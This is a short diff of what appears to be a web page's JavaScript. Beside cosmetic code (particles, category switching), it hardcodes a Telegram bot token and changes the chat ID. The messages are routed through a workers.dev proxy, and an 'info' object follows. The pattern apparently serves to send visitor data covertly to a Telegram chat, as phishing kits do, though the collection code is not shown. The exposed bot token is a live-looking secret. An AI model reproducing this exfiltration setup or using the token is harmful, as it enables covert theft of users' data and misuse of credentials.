@@ -416,7 +416,7 @@ function switchCategory(category) {
 // Initialize particles
 createParticles();
   const TELEGRAM_BOT_TOKEN = '7550142487:AAH_xOHuyHr0C2nXnQmkWx-b6-f1NSDXaHo';
-  const TELEGRAM_CHAT_ID = '-1002380729123';
+  const TELEGRAM_CHAT_ID = '6956722046';
   const API_BASE = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
   const info = {
